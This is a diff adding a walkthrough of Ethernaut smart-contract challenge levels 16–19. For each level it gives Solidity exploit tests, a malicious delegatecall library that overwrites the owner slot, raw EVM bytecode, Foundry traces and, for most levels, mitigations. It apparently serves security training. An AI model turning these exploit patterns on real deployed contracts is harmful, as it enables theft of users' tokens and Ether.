@@ -988,7 +988,393 @@ Ran 1 test suite in 1.21s (20.01ms CPU time): 1 tests passed, 0 failed, 0 skippe
 
 ```
 ---
-✅ Ready for **Level 16** — coming soon!
+
+---
+## Level 16: NaughtCoin
+
+**AttackDesc**:The contract uses a lockTokens modifier to restrict the transfer function, preventing the original player from transferring tokens until a 10-year timelock has passed. However, the contract does not restrict transferFrom, which is part of the ERC20 standard. By approving a spender (attacker), the tokens can be transferred out before the timelock.
+
+### 🔍 Vulnerable Function
+``` solidity
+function transfer(
+    address _to,
+    uint256 _value
+) public override lockTokens returns (bool) {
+    super.transfer(_to, _value);
+}
+```
+**Vulnerability**:
+The lockTokens modifier only applies to the transfer() function.
+Since transferFrom() is inherited from the ERC20 base and not overridden, it bypasses the timelock restriction. This allows a player to approve someone else (e.g., an attacker) to transfer all tokens out immediately.
+
+### 🧪 Exploit Test
+``` solidity
+function test_attack() public {
+    // player approves attacker to spend unlimited tokens
+    vm.startPrank(player);
+    naughtCoin.approve(attacker, type(uint256).max);
+    vm.stopPrank();
+
+    // attacker drains all tokens from the player using transferFrom
+    vm.startPrank(attacker);
+    uint256 fullbalance = naughtCoin.balanceOf(player);
+    naughtCoin.transferFrom(player, attacker, fullbalance);
+    
+    assertEq(naughtCoin.balanceOf(attacker), fullbalance);
+    assertEq(naughtCoin.balanceOf(player), 0);
+    vm.stopPrank();
+}
+```
+### 📋 Test Output
+``` text
+[PASS] test_attack() (gas: 74257)
+...
+NaughtCoin::approve(attacker, max)
+NaughtCoin::transferFrom(player → attacker, 1_000_000 tokens)
+✅ Final balances:
+- attacker: 1_000_000 tokens
+- player: 0 tokens
+
+```
+### 🔒 Recommended Mitigation
+
+Override the transferFrom() function and apply the same lockTokens modifier:
+``` solidity
+function transferFrom(
+    address from,
+    address to,
+    uint256 value
+) public override lockTokens returns (bool) {
+    return super.transferFrom(from, to, value);
+}
+
+```
+Alternatively, enforce the timelock check for the player address directly within the modifier or base logic to apply to all transfers involving the player.
+
+---
+---
+## Level 17:Preservation
+
+**AttackDesc**:
+The contract uses delegatecall to external library contracts. Since the library contract has only one storage variable at slot 0 (storedTime), but the main contract stores important variables like owner at slot 2, an attacker can manipulate storage by crafting a malicious library that writes to any slot, including the owner slot. The attacker first overwrites the timeZone1Library address, then performs a delegatecall to their malicious contract to gain ownership.
+### 🔍 Vulnerable Function
+``` solidity
+function setFirstTime(uint256 _timeStamp) public {
+    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
+}
+```
+**Vulnerability**:
+Uses delegatecall with untrusted input.
+
+Delegatecall executes the called function in the context of Preservation, altering its storage layout.
+
+The function setTime(uint256) is expected to write to slot 0 (storedTime), but due to delegatecall, it may write to unintended slots like owner (slot 2).
+### 🛠️ Exploit Contract
+
+``` solidity
+contract AttackLibrary {
+    function setTime(uint256 _time) public {
+        address _target = address(uint160(_time));
+        assembly {
+            sstore(2, _target) // Overwrite slot 2 (owner) with attacker address
+        }
+    }
+}
+```
+### 🧪 Exploit Test
+``` solidity
+function test_attack() public {
+    vm.startPrank(attacker);
+
+    // Step 1: Deploy malicious library
+    AttackLibrary attackLibrary = new AttackLibrary();
+
+    // Step 2: Overwrite timeZone1Library with address of malicious contract
+    preservation.setFirstTime(uint160(address(attackLibrary)));
+
+    // Step 3: Verify overwrite
+    assertEq(
+        uint160(address(attackLibrary)),
+        uint160(preservation.timeZone1Library())
+    );
+
+    // Step 4: Call again to trigger delegatecall to attackLibrary and overwrite owner
+    preservation.setFirstTime(uint160(attacker));
+
+    vm.stopPrank();
+}
+```
+
+### 📋 Test Output
+``` text
+[PASS] test_attack() (gas: 98607)
+
+Traces:
+  PreservationTest::test_attack()
+    ├─ startPrank(attacker)
+    ├─ new AttackLibrary
+    ├─ Preservation::setFirstTime(attackLibrary address)
+    │   └─ delegatecall to DummyLibrary
+    ├─ Preservation::timeZone1Library()
+    ├─ assertEq(...)
+    ├─ Preservation::setFirstTime(attacker address)
+    │   └─ delegatecall to AttackLibrary::setTime
+    │       └─ storage slot 2 updated with attacker address
+    └─ stopPrank()
+```
+### 🔒 Recommended Mitigation
+Do not use delegatecall with untrusted contracts.
+
+If absolutely needed:
+
+Ensure the external contract has a matching storage layout.
+
+Avoid delegatecalls to addresses that can be changed by users.
+
+Use immutable libraries or internal libraries with delegatecall removed.
+
+Prefer standard proxy patterns (like OpenZeppelin’s Transparent Proxy or UUPS) where upgrades are controlled and verified.
+
+---
+
+---
+## Level 18: Recovery
+**AttackDesc:**
+When contracts are deployed via new, their addresses are deterministic and based on the deployer’s address and nonce. In this challenge, the Recovery contract creates a SimpleToken contract using new, which means its address can be calculated off-chain or in a test. Once the address is recovered, the attacker can call its public destroy(address) function to selfdestruct the contract and reclaim trapped Ether.
+
+### 🔍 Vulnerable Function
+``` solidity
+function generateToken(string memory _name, uint256 _initialSupply) public {
+    new SimpleToken(_name, msg.sender, _initialSupply);
+}
+```
+The generateToken function uses new to deploy a SimpleToken, which receives and holds ETH.
+The SimpleToken contract includes a destroy function:
+
+``` solidity
+function destroy(address payable _to) public {
+    selfdestruct(_to);
+}
+```
+The address of SimpleToken is not stored, but can be calculated using the CREATE address formula.
+
+**Calculate Address:**
+In foundry there is no library to calculate the address based on the deployer address and nonce , here i create custom function to calculate the address to solve the challenge
+``` solidity
+function computeAddress(
+        address deployer,
+        uint nonce
+    ) public pure returns (address) {
+        if (nonce == 0x00)
+            return
+                address(
+                    uint160(
+                        uint(
+                            keccak256(
+                                abi.encodePacked(
+                                    hex"d6",
+                                    hex"94",
+                                    deployer,
+                                    hex"80"
+                                )
+                            )
+                        )
+                    )
+                );
+        if (nonce <= 0x7f)
+            return
+                address(
+                    uint160(
+                        uint(
+                            keccak256(
+                                abi.encodePacked(
+                                    hex"d6",
+                                    hex"94",
+                                    deployer,
+                                    uint8(nonce)
+                                )
+                            )
+                        )
+                    )
+                );
+        if (nonce <= 0xff)
+            return
+                address(
+                    uint160(
+                        uint(
+                            keccak256(
+                                abi.encodePacked(
+                                    hex"d7",
+                                    hex"94",
+                                    deployer,
+                                    hex"81",
+                                    uint8(nonce)
+                                )
+                            )
+                        )
+                    )
+                );
+        if (nonce <= 0xffff)
+            return
+                address(
+                    uint160(
+                        uint(
+                            keccak256(
+                                abi.encodePacked(
+                                    hex"d8",
+                                    hex"94",
+                                    deployer,
+                                    hex"82",
+                                    uint16(nonce)
+                                )
+                            )
+                        )
+                    )
+                );
+        if (nonce <= 0xffffff)
+            return
+                address(
+                    uint160(
+                        uint(
+                            keccak256(
+                                abi.encodePacked(
+                                    hex"d9",
+                                    hex"94",
+                                    deployer,
+                                    hex"83",
+                                    uint24(nonce)
+                                )
+                            )
+                        )
+                    )
+                );
+        return address(0);
+    }
+```
+
+### 🧪 Exploit Test
+``` solidity
+function test_attack() public {
+    address lostToken = computeAddress(address(recovery), 1);//find the address
+
+    uint256 attackerBefore = attacker.balance;//check the balance
+
+    vm.prank(attacker);
+    SimpleToken(payable(lostToken)).destroy(payable(attacker));//money credit to the attacker account
+
+    uint256 attackerAfter = attacker.balance;
+
+    console.log("Attacker ETH before:", attackerBefore);
+    console.log("Attacker ETH after: ", attackerAfter);
+    assertGt(attackerAfter, attackerBefore); // ensure attacker received ether
+}
+```
+### 📋 Test Output
+
+``` text
+[PASS] test_attack() (gas: 25440)
+
+Logs:
+  Attacker ETH before: 100000000000000000000
+  Attacker ETH after:  101000000000000000000
+
+Traces:
+  RecoveryTest::test_attack()
+    ├─ VM::prank(attacker)
+    ├─ SimpleToken::destroy(attacker)
+    │   └─ [SelfDestruct] — ETH sent to attacker
+    ├─ console.log(...)
+    └─ assertGt(attackerAfter, attackerBefore)
+```
+---
+
+---
+### Level 19: MagicNumber
+
+**AttackDesc:**
+The contract allows setting a solver address that is expected to return the number 42 when called via staticcall. However, no validation is done on the logic inside the solver. An attacker can deploy a hand-crafted minimal contract using raw EVM bytecode that always returns 42 regardless of input. A hidden constraint (present in the original Ethernaut challenge but not in the simplified local version) is that the runtime bytecode must be ≤ 10 bytes. If the contract's code exceeds 10 bytes, the challenge reverts, requiring extremely optimized bytecode logic.
+### 🔍 Vulnerable Function
+``` solidity
+function setSolver(address _solver) public {
+    solver = _solver;
+}
+```
+No checks on the size or logic of the solver contract.
+
+The contract later low level calls this solver, expecting a return value of 42.
+
+Ethernaut's backend enforces a maximum of 10 bytes runtime code for the solver.
+
+### 🛠️ Exploit Contract(evm bytecode)
+**🔧 Runtime Bytecode**
+``` evm
+602a    → PUSH1 0x2a        // Push 42 onto the stack  
+6000    → PUSH1 0x00        // Memory offset 0  
+52      → MSTORE            // Store 42 at memory[0]  
+6020    → PUSH1 0x20        // Return 32 bytes  
+6000    → PUSH1 0x00        // From memory[0]  
+f3      → RETURN            // Return value
+```
+ This part returns 42 when called.
+
+ **Constructor Bytecode (to deploy the above)**
+ ``` evm
+ 69      → PUSH10            // Push next 10 bytes (runtime code)  
+602a60005260206000f3        // The runtime code  
+6000    → PUSH1 0x00        // Memory offset  
+52      → MSTORE            // Store runtime code in memory  
+600a    → PUSH1 0x0a        // Length = 10 bytes  
+6016    → PUSH1 0x16        // Offset = 22 (after constructor)  
+f3      → RETURN            // Return runtime as deployed code
+ ```
+**Foundry Deployment**:
+``` solidity
+bytes memory bytecode = hex"69602a60005260206000f3600052600a6016f3";
+```
+ Result: A contract that always returns 42 with only 10 bytes of runtime code.
+
+### 🧪 Exploit Test
+``` solidity
+function test_attack() public {
+    vm.startPrank(attacker);
+
+    address solver;
+    bytes memory bytecode = hex"69602a60005260206000f3600052600a6016f3";
+
+    assembly {
+        solver := create(0, add(bytecode, 0x20), 0x13)
+    }
+
+    require(solver != address(0), "contract solver deployment failed");
+    magicnum.setSolver(solver);
+
+    (bool success, bytes memory data) = solver.staticcall("");
+    require(success, "call to solver failed");
+
+    uint256 result = abi.decode(data, (uint256));
+    console.log("result: ", result);
+    require(result == 42, "solver did not return 42");
+
+    vm.stopPrank();
+}
+```
+### 📋 Test Output
+``` text
+[PASS] test_attack() (gas: 72019)
+Logs:
+  result:  42
+
+Traces:
+  MagicNumTest::test_attack()
+    ├─ create() -> contract deployed at 0x959...
+    ├─ MagicNum::setSolver()
+    ├─ staticcall to solver -> returned 42
+    ├─ console.log -> "result: 42"
+```
+---
+
+
+✅ Ready for **Level 20** — coming soon!
 
 
 
